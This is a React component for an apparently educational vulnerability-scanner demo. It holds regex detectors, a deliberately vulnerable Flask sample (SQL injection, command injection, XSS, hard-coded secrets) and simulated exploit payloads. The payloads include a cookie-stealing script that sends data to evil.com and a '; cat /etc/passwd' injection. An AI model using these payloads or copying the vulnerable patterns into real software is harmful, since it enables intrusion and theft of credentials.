import { useState } from 'react';
import { Bug, ShieldAlert, ShieldCheck, Zap, Code2, FileCode2, Copy, AlertTriangle, CheckCircle2, XCircle, Loader2 } from 'lucide-react';

/* ═══════════════════════════════════════════════════════
   VULNERABILITY PATTERNS — client-side scanner
   ═══════════════════════════════════════════════════════ */
const VULN_PATTERNS = [
    {
        id: 'SQLI-001', name: 'SQL Injection', severity: 'CRITICAL',
        regex: /cursor\.execute\s*\(\s*f['"]/i,
        desc: 'User input concatenated directly into SQL query string via f-string.',
        hint: 'Use parameterized queries: cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))',
    },
    {
        id: 'SQLI-002', name: 'SQL Injection (concat)', severity: 'CRITICAL',
        regex: /(?:SELECT|INSERT|UPDATE|DELETE)\s.*\+\s*(?:request|input|user|params|args|data)/i,
        desc: 'SQL statement built via string concatenation with user input.',
        hint: 'Use parameterized queries with placeholder values.',
    },
    {
        id: 'XSS-001', name: 'Cross-Site Scripting (innerHTML)', severity: 'HIGH',
        regex: /\.innerHTML\s*=/i,
        desc: 'Direct innerHTML assignment may allow script injection.',
        hint: 'Use textContent or sanitize HTML with DOMPurify.',
    },
    {
        id: 'XSS-002', name: 'Cross-Site Scripting (document.write)', severity: 'HIGH',
        regex: /document\.write\s*\(/i,
        desc: 'document.write can inject unsanitized markup.',
        hint: 'Avoid document.write; use safe DOM APIs.',
    },
    {
        id: 'CMDI-001', name: 'Command Injection', severity: 'CRITICAL',
        regex: /(?:os\.system|subprocess\.call|subprocess\.run|exec|eval)\s*\(.*(?:\+|format|%)/i,
        desc: 'OS command built with user-controlled input.',
        hint: 'Use subprocess.run([...], capture_output=True) with list args; never build shell strings.',
    },
    {
        id: 'PATH-001', name: 'Path Traversal', severity: 'HIGH',
        regex: /open\s*\(\s*(?:request|input|user|params|args)/i,
        desc: 'File opened with unsanitized user input — path traversal risk.',
        hint: 'Validate and sanitize file paths; use os.path.realpath and whitelist allowed directories.',
    },
    {
        id: 'HARDCRED-001', name: 'Hard-coded Credentials', severity: 'MEDIUM',
        regex: /(?:password|passwd|secret|api_key|token)\s*=\s*['"][^'"]{4,}['"]/i,
        desc: 'Sensitive credentials hard-coded in source code.',
        hint: 'Use environment variables or a secrets manager (e.g., AWS Secrets Manager, HashiCorp Vault).',
    },
    {
        id: 'DESERIAL-001', name: 'Insecure Deserialization', severity: 'CRITICAL',
        regex: /pickle\.loads?\s*\(/i,
        desc: 'pickle.load with untrusted data can execute arbitrary code.',
        hint: 'Use JSON or a safe serializer; validate input source.',
    },
    {
        id: 'SSRF-001', name: 'Server-Side Request Forgery', severity: 'HIGH',
        regex: /requests\.(?:get|post|put)\s*\(\s*(?:request|input|user|params|url)/i,
        desc: 'HTTP request made with user-controlled URL — SSRF risk.',
        hint: 'Validate and whitelist allowed domains; block internal IPs.',
    },
    {
        id: 'WKKEY-001', name: 'Weak Cryptographic Key', severity: 'MEDIUM',
        regex: /(?:SECRET_KEY|JWT_SECRET|APP_KEY)\s*=\s*['"][^'"]{4,}['"]/i,
        desc: 'Cryptographic secret hard-coded — may be weak or leaked.',
        hint: 'Generate strong random secrets and store in environment variables.',
    },
];

function scanCode(code) {
    const findings = [];
    const lines = code.split('\n');
    for (const vuln of VULN_PATTERNS) {
        lines.forEach((line, i) => {
            if (vuln.regex.test(line)) {
                findings.push({
                    id: vuln.id,
                    name: vuln.name,
                    severity: vuln.severity,
                    line: i + 1,
                    code: line.trim(),
                    description: vuln.desc,
                    patch_hint: vuln.hint,
                });
            }
        });
    }
    const weights = { CRITICAL: 30, HIGH: 20, MEDIUM: 10 };
    const patch = generatePatch(code, findings);
    return {
        total_vulnerabilities: findings.length,
        findings,
        ai_patch: patch,
        risk_score: Math.min(100, findings.reduce((sum, f) => sum + (weights[f.severity] || 5), 0)),
    };
}

function generatePatch(code, findings) {
    if (!findings.length) return '# ✅ No vulnerabilities detected — code is clean.\n' + code;

    const header = [
        '# ═══════════════════════════════════════════════',
        '# 🛡️  AI-GENERATED SECURITY PATCH',
        '# ═══════════════════════════════════════════════',
        '',
        ...findings.map(f => `# [FIX ${f.id}] Line ${f.line}: ${f.patch_hint}`),
        '',
    ].join('\n');

    let patched = code;
    // SQL Injection fix
    patched = patched.replace(
        /cursor\.execute\s*\(\s*f['"]SELECT \* FROM users WHERE id = '\{(\w+)\}'['"]\)/g,
        'cursor.execute("SELECT * FROM users WHERE id = %s", ($1,))'
    );
    // Command Injection fix
    patched = patched.replace(
        /os\.system\s*\(["'].*?["']\s*\+\s*(\w+)\)/g,
        'subprocess.run(["ls", "-la", $1], capture_output=True, check=True)'
    );
    // innerHTML fix
    patched = patched.replace(
        /\.innerHTML\s*=\s*(.+)/g,
        '.textContent = $1  // Sanitized: use textContent instead of innerHTML'
    );
    // Hard-coded password fix
    patched = patched.replace(
        /password\s*=\s*["'][^"']+["']/gi,
        'password = os.environ.get("APP_PASSWORD")  # Moved to environment variable'
    );
    patched = patched.replace(
        /api_key\s*=\s*["'][^"']+["']/gi,
        'api_key = os.environ.get("API_KEY")  # Moved to environment variable'
    );

    return header + patched;
}

/* ═══════════════════════════════════════════════════════
   EXAMPLE VULNERABLE CODE
   ═══════════════════════════════════════════════════════ */
const EXAMPLE_CODE = `import sqlite3
import os
from flask import Flask, request

app = Flask(__name__)

# Hard-coded credentials (vulnerability!)
password = "SuperSecret123!"
api_key = "sk-proj-ABCDEF123456789"

@app.route("/user")
def get_user():
    user_id = request.args.get("id")
    conn = sqlite3.connect("app.db")
    cursor = conn.cursor()
    # SQL Injection vulnerability!
    cursor.execute(f"SELECT * FROM users WHERE id = '{user_id}'")
    result = cursor.fetchone()
    return str(result)

@app.route("/run")
def run_cmd():
    cmd = request.args.get("cmd")
    # Command Injection vulnerability!
    os.system("ls -la " + cmd)
    return "done"

@app.route("/page")
def render_page():
    name = request.args.get("name")
    # XSS vulnerability!
    return """
    <script>
        document.getElementById('output').innerHTML = '""" + name + """'
    </script>
    """
`;

/* ═══════════════════════════════════════════════════════
   SEVERITY STYLING
   ═══════════════════════════════════════════════════════ */
const SEVERITY_STYLES = {
    CRITICAL: {
        badge: 'text-red-400 bg-red-500/10 border border-red-500/30',
        icon: <XCircle className="w-4 h-4 text-red-400" />,
    },
    HIGH: {
        badge: 'text-amber-400 bg-amber-500/10 border border-amber-500/30',
        icon: <AlertTriangle className="w-4 h-4 text-amber-400" />,
    },
    MEDIUM: {
        badge: 'text-blue-400 bg-blue-500/10 border border-blue-500/30',
        icon: <ShieldAlert className="w-4 h-4 text-blue-400" />,
    },
    LOW: {
        badge: 'text-green-400 bg-green-500/10 border border-green-500/30',
        icon: <CheckCircle2 className="w-4 h-4 text-green-400" />,
    },
};

/* ═══════════════════════════════════════════════════════
   EXPLOIT SIMULATION
   ═══════════════════════════════════════════════════════ */
function simulateExploit(finding) {
    const exploits = {
        'SQLI-001': {
            payload: "' OR 1=1 --",
            result: "⚠️ Query returned ALL rows from 'users' table.\n   Attacker can dump entire database.",
            url: "/user?id=' OR 1=1 --",
        },
        'SQLI-002': {
            payload: "'; DROP TABLE users; --",
            result: "⚠️ Secondary query executed.\n   Attacker can delete or modify tables.",
            url: "/user?id='; DROP TABLE users; --",
        },
        'XSS-001': {
            payload: '<img src=x onerror=alert(document.cookie)>',
            result: "⚠️ JavaScript executed in victim's browser.\n   Attacker can steal session cookies.",
            url: '/page?name=<img src=x onerror=alert(document.cookie)>',
        },
        'XSS-002': {
            payload: '<script>fetch("https://evil.com?c="+document.cookie)</script>',
            result: "⚠️ Injected script sends cookies to attacker server.",
            url: '/page?input=<script>...</script>',
        },
        'CMDI-001': {
            payload: '; cat /etc/passwd',
            result: "⚠️ Arbitrary command executed on server.\n   Attacker has shell access.",
            url: '/run?cmd=; cat /etc/passwd',
        },
        'HARDCRED-001': {
            payload: 'N/A (static analysis)',
            result: "⚠️ Credentials exposed in source code.\n   Anyone with repo access can extract secrets.",
            url: 'N/A',
        },
    };
    return exploits[finding.id] || {
        payload: 'Simulated payload',
        result: `⚠️ ${finding.description}`,
        url: 'N/A',
    };
}

/* ═══════════════════════════════════════════════════════
   MAIN COMPONENT
   ═══════════════════════════════════════════════════════ */
export default function DevSecOps() {
    const [code, setCode] = useState(EXAMPLE_CODE);
    const [results, setResults] = useState(null);
    const [scanning, setScanning] = useState(false);
    const [showPatch, setShowPatch] = useState(false);
    const [exploitTarget, setExploitTarget] = useState(null);
    const [exploitResult, setExploitResult] = useState(null);
    const [exploiting, setExploiting] = useState(false);
    const [copied, setCopied] = useState(false);

    const handleScan = async () => {
        setScanning(true);
        setResults(null);
        setShowPatch(false);
        setExploitTarget(null);
        setExploitResult(null);

        // Animated delay for UX
        await new Promise(r => setTimeout(r, 1800));

        // Try backend first, fallback to client-side
        try {
            const res = await fetch('/api/scan', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ code }),
            });
            if (res.ok) {
                const data = await res.json();
                setResults(data);
                setScanning(false);
                return;
            }
        } catch { /* fallback below */ }

        setResults(scanCode(code));
        setScanning(false);
    };

    const handleExploit = async (finding) => {
        setExploiting(true);
        setExploitTarget(finding.id);
        setExploitResult(null);
        await new Promise(r => setTimeout(r, 1200));
        setExploitResult(simulateExploit(finding));
        setExploiting(false);
    };

    const handleCopyPatch = () => {
        if (results?.ai_patch) {
            navigator.clipboard?.writeText(results.ai_patch);
            setCopied(true);
            setTimeout(() => setCopied(false), 2000);
        }
    };

    return (
        <div className="max-w-7xl mx-auto px-4 py-6">
            {/* ── Header ── */}
            <div className="flex items-center gap-3 mb-6">
                <Bug className="w-7 h-7 text-neon-amber" style={{ filter: 'drop-shadow(0 0 8px rgba(245,158,11,0.5))' }} />
                <h1 className="font-[Orbitron] text-2xl font-bold text-white text-glow-blue">DEVSECOPS SHIELD</h1>
                <span className="text-xs text-gray-500 font-mono ml-2">AI-Powered Vulnerability Scanner</span>
            </div>

            <div className="grid grid-cols-12 gap-4">
                {/* ══════ LEFT: Code Input ══════ */}
                <div className="col-span-12 lg:col-span-6">
                    <div className="glass-card overflow-hidden flex flex-col h-[700px]">
                        <div className="px-4 py-3 border-b border-white/5 bg-black/30 flex items-center justify-between shrink-0">
                            <div className="flex items-center gap-2">
                                <FileCode2 className="w-4 h-4 text-neon-purple" />
                                <span className="font-[Orbitron] text-xs font-semibold text-neon-purple tracking-wider">SOURCE CODE INPUT</span>
                            </div>
                            <button
                                className={`btn-neon text-xs py-2 px-5 flex items-center gap-2 ${scanning ? 'btn-neon-purple' : 'btn-neon-red'}`}
                                onClick={handleScan}
                                disabled={scanning || !code.trim()}
                            >
                                {scanning ? (
                                    <>
                                        <Loader2 className="w-3.5 h-3.5 animate-spin" />
                                        Scanning...
                                    </>
                                ) : (
                                    <>
                                        <Zap className="w-3.5 h-3.5" />
                                        Scan Code
                                    </>
                                )}
                            </button>
                        </div>

                        {/* Line numbers + textarea */}
                        <div className="flex flex-1 overflow-hidden">
                            <div className="py-4 px-2 text-right select-none border-r border-white/5 bg-black/20 overflow-hidden shrink-0 w-12">
                                {code.split('\n').map((_, i) => (
                                    <div key={i} className="text-[11px] font-mono text-gray-600 leading-[1.65]">{i + 1}</div>
                                ))}
                            </div>
                            <textarea
                                value={code}
                                onChange={e => setCode(e.target.value)}
                                className="flex-1 bg-transparent text-gray-300 text-sm p-4 resize-none outline-none overflow-auto"
                                style={{ fontFamily: "'JetBrains Mono', monospace", lineHeight: '1.65', tabSize: 4 }}
                                placeholder="Paste your code here to scan for vulnerabilities..."
                                spellCheck={false}
                            />
                        </div>

                        {/* Footer stats */}
                        <div className="px-4 py-2 border-t border-white/5 bg-black/20 flex items-center justify-between text-[11px] font-mono text-gray-600 shrink-0">
                            <span>{code.split('\n').length} lines</span>
                            <span>{code.length} characters</span>
                        </div>
                    </div>
                </div>

                {/* ══════ RIGHT: Results ══════ */}
                <div className="col-span-12 lg:col-span-6 space-y-4">

                    {/* ── Scanning animation ── */}
                    {scanning && (
                        <div className="glass-card p-10 text-center">
                            <div className="w-20 h-20 mx-auto mb-5 relative">
                                <div className="absolute inset-0 rounded-full border-4 border-neon-purple/20" />
                                <div className="absolute inset-0 rounded-full border-4 border-transparent border-t-neon-purple animate-spin" />
                                <div className="absolute inset-3 rounded-full border-4 border-transparent border-t-neon-cyan animate-spin" style={{ animationDirection: 'reverse', animationDuration: '1.5s' }} />
                                <Bug className="absolute inset-0 m-auto w-6 h-6 text-neon-purple" />
                            </div>
                            <p className="text-neon-purple font-[Orbitron] text-sm mb-1">ANALYZING CODE PATTERNS...</p>
                            <p className="text-gray-500 text-xs font-mono">Running AI vulnerability detection engine</p>
                        </div>
                    )}

                    {/* ── No results yet ── */}
                    {!results && !scanning && (
                        <div className="glass-card p-12 text-center">
                            <Bug className="w-14 h-14 text-gray-700 mx-auto mb-4" />
                            <p className="text-gray-400 font-[Orbitron] text-sm mb-2">Ready to Scan</p>
                            <p className="text-gray-600 text-xs font-mono max-w-xs mx-auto">
                                Paste vulnerable code in the editor and click "Scan Code" to detect security issues.
                                Example code is pre-loaded — try scanning it!
                            </p>
                        </div>
                    )}

                    {/* ── Risk Score ── */}
                    {results && (
                        <div className="glass-card p-5 animate-slide-up">
                            <div className="flex items-center justify-between mb-4">
                                <div>
                                    <span className="font-[Orbitron] text-xs text-gray-500 tracking-wider">RISK SCORE</span>
                                    <div className="flex items-center gap-2 mt-1">
                                        {results.risk_score >= 75 ? (
                                            <XCircle className="w-5 h-5 text-red-400" />
                                        ) : results.risk_score >= 40 ? (
                                            <AlertTriangle className="w-5 h-5 text-amber-400" />
                                        ) : (
                                            <CheckCircle2 className="w-5 h-5 text-green-400" />
                                        )}
                                        <span className="text-gray-400 text-sm font-mono">
                                            {results.total_vulnerabilities} {results.total_vulnerabilities === 1 ? 'vulnerability' : 'vulnerabilities'} detected
                                        </span>
                                    </div>
                                </div>
                                <div className={`font-[Orbitron] text-4xl font-black ${results.risk_score >= 75 ? 'text-red-400 text-glow-red' :
                                    results.risk_score >= 40 ? 'text-amber-400' :
                                        results.risk_score > 0 ? 'text-blue-400' :
                                            'text-green-400 text-glow-green'
                                    }`}>
                                    {results.risk_score}
                                </div>
                            </div>
                            {/* Progress bar */}
                            <div className="w-full h-3 rounded-full bg-white/5 overflow-hidden">
                                <div
                                    className="h-full rounded-full transition-all duration-1000 ease-out"
                                    style={{
                                        width: `${results.risk_score}%`,
                                        background: results.risk_score >= 75
                                            ? 'linear-gradient(90deg, #ef4444, #ec4899)'
                                            : results.risk_score >= 40
                                                ? 'linear-gradient(90deg, #f59e0b, #ef4444)'
                                                : results.risk_score > 0
                                                    ? 'linear-gradient(90deg, #3b82f6, #8b5cf6)'
                                                    : 'linear-gradient(90deg, #10b981, #06b6d4)',
                                    }}
                                />
                            </div>
                            <div className="flex justify-between mt-2 text-[10px] font-mono text-gray-600">
                                <span>LOW</span>
                                <span>MEDIUM</span>
                                <span>HIGH</span>
                                <span>CRITICAL</span>
                            </div>
                        </div>
                    )}

                    {/* ── Vulnerability Findings ── */}
                    {results?.findings.length > 0 && (
                        <div className="glass-card overflow-hidden animate-slide-up" style={{ animationDelay: '0.15s' }}>
                            <div className="px-4 py-3 border-b border-white/5 bg-black/30 flex items-center justify-between">
                                <div className="flex items-center gap-2">
                                    <ShieldAlert className="w-4 h-4 text-red-400" />
                                    <span className="font-[Orbitron] text-xs font-semibold text-red-400 tracking-wider">VULNERABILITIES</span>
                                </div>
                                <span className="text-[10px] font-mono text-gray-500">click to simulate exploit</span>
                            </div>
                            <div className="divide-y divide-white/5 max-h-[380px] overflow-y-auto">
                                {results.findings.map((f, i) => {
                                    const sev = SEVERITY_STYLES[f.severity] || SEVERITY_STYLES.MEDIUM;
                                    const isExploitTarget = exploitTarget === f.id;
                                    return (
                                        <div key={i} className="p-4 hover:bg-white/3 transition-colors">
                                            {/* Header */}
                                            <div className="flex items-center gap-2 mb-2">
                                                <span className={`text-[10px] px-2 py-0.5 rounded-full font-mono font-bold ${sev.badge}`}>
                                                    {f.severity}
                                                </span>
                                                <span className="font-mono text-xs text-white font-semibold">{f.id}</span>
                                                <span className="text-xs text-gray-400">— {f.name}</span>
                                                <span className="text-[10px] text-gray-600 font-mono ml-auto">line {f.line}</span>
                                            </div>

                                            {/* Description */}
                                            <p className="text-xs text-gray-500 mb-2">{f.description}</p>

                                            {/* Vulnerable code */}
                                            <div className="font-mono text-xs text-red-400/80 bg-red-500/5 px-3 py-2 rounded-lg border border-red-500/10 mb-2 overflow-x-auto">
                                                <span className="text-gray-600 mr-2">{f.line} │</span>
                                                {f.code}
                                            </div>

                                            {/* Fix hint */}
                                            {(f.patch_hint || f.hint) && (
                                                <div className="text-xs text-green-400/80 flex items-start gap-1.5 mb-3">
                                                    <ShieldCheck className="w-3.5 h-3.5 shrink-0 mt-0.5" />
                                                    <span>{f.patch_hint || f.hint}</span>
                                                </div>
                                            )}

                                            {/* Exploit button */}
                                            <button
                                                onClick={() => handleExploit(f)}
                                                disabled={exploiting}
                                                className="text-[11px] font-mono px-3 py-1.5 rounded-md bg-red-500/10 border border-red-500/20 text-red-400 hover:bg-red-500/20 transition-colors cursor-pointer flex items-center gap-1.5"
                                            >
                                                {exploiting && isExploitTarget ? (
                                                    <><Loader2 className="w-3 h-3 animate-spin" /> Exploiting...</>
                                                ) : (
                                                    <><Zap className="w-3 h-3" /> Simulate Exploit</>
                                                )}
                                            </button>

                                            {/* Exploit result */}
                                            {isExploitTarget && exploitResult && (
                                                <div className="mt-3 p-3 rounded-lg bg-red-500/5 border border-red-500/20 animate-fade-in">
                                                    <div className="text-[10px] font-[Orbitron] text-red-400 mb-2 tracking-wider">EXPLOIT SIMULATION</div>
                                                    <div className="text-xs font-mono text-gray-400 space-y-1">
                                                        <div><span className="text-gray-600">Payload:</span> <span className="text-amber-400">{exploitResult.payload}</span></div>
                                                        <div><span className="text-gray-600">URL:</span> <span className="text-blue-400">{exploitResult.url}</span></div>
                                                        <div className="pt-1 text-red-400 whitespace-pre-wrap">{exploitResult.result}</div>
                                                    </div>
                                                    <div className="mt-2 text-[10px] font-[Orbitron] text-green-400 tracking-wider flex items-center gap-1">
                                                        <CheckCircle2 className="w-3 h-3" /> VULNERABILITY CONFIRMED — EXPLOIT SUCCESSFUL
                                                    </div>
                                                </div>
                                            )}
                                        </div>
                                    );
                                })}
                            </div>
                        </div>
                    )}

                    {/* ── AI Patch ── */}
                    {results?.ai_patch && (
                        <div className="glass-card overflow-hidden animate-slide-up" style={{ animationDelay: '0.3s' }}>
                            <div className="px-4 py-3 border-b border-white/5 bg-black/30 flex items-center justify-between">
                                <div className="flex items-center gap-2">
                                    <Code2 className="w-4 h-4 text-green-400" />
                                    <span className="font-[Orbitron] text-xs font-semibold text-green-400 tracking-wider">AI-GENERATED PATCH</span>
                                </div>
                                <button
                                    className="text-xs text-gray-500 hover:text-white transition-colors cursor-pointer font-mono"
                                    onClick={() => setShowPatch(!showPatch)}
                                >
                                    [{showPatch ? 'HIDE' : 'SHOW'}]
                                </button>
                            </div>
                            {showPatch && (
                                <div className="p-4">
                                    <pre className="text-xs font-mono text-gray-300 bg-black/40 p-4 rounded-lg overflow-x-auto whitespace-pre-wrap max-h-[350px] overflow-y-auto border border-white/5 leading-relaxed">
                                        {results.ai_patch}
                                    </pre>
                                    <button
                                        className={`btn-neon btn-neon-green text-xs mt-3 py-2.5 w-full flex items-center justify-center gap-2`}
                                        onClick={handleCopyPatch}
                                    >
                                        {copied ? (
                                            <><CheckCircle2 className="w-3.5 h-3.5" /> Copied!</>
                                        ) : (
                                            <><Copy className="w-3.5 h-3.5" /> Copy Patched Code</>
                                        )}
                                    </button>
                                </div>
                            )}
                        </div>
                    )}

                    {/* ── Patch Metrics ── */}
                    {results?.patch_metrics && results.patch_metrics.before > 0 && (
                        <div className="glass-card p-4 animate-slide-up" style={{ animationDelay: '0.25s' }}>
                            <div className="flex items-center gap-2 mb-3">
                                <ShieldCheck className="w-4 h-4 text-neon-cyan" />
                                <span className="font-[Orbitron] text-xs font-semibold text-neon-cyan tracking-wider">PATCH METRICS</span>
                            </div>
                            <div className="grid grid-cols-3 gap-3 text-center">
                                <div className="bg-red-500/10 border border-red-500/20 rounded-lg p-3">
                                    <div className="font-[Orbitron] text-xl font-bold text-red-400">{results.patch_metrics.before}</div>
                                    <div className="text-[10px] font-mono text-gray-500 mt-1">BEFORE</div>
                                </div>
                                <div className="bg-green-500/10 border border-green-500/20 rounded-lg p-3">
                                    <div className="font-[Orbitron] text-xl font-bold text-green-400">{results.patch_metrics.after}</div>
                                    <div className="text-[10px] font-mono text-gray-500 mt-1">AFTER</div>
                                </div>
                                <div className="bg-blue-500/10 border border-blue-500/20 rounded-lg p-3">
                                    <div className="font-[Orbitron] text-xl font-bold text-blue-400">{results.patch_metrics.reduction}</div>
                                    <div className="text-[10px] font-mono text-gray-500 mt-1">FIXED</div>
                                </div>
                            </div>
                        </div>
                    )}

                    {/* ── Clean code result ── */}
                    {results && results.total_vulnerabilities === 0 && (
                        <div className="glass-card p-10 text-center animate-slide-up">
                            <ShieldCheck className="w-14 h-14 text-green-400 mx-auto mb-3" style={{ filter: 'drop-shadow(0 0 12px rgba(16,185,129,0.5))' }} />
                            <p className="font-[Orbitron] text-lg text-green-400 font-bold text-glow-green mb-1">CODE IS CLEAN</p>
                            <p className="text-gray-500 text-xs font-mono">No known vulnerability patterns detected.</p>
                        </div>
                    )}
                </div>
            </div>
        </div>
    );
}
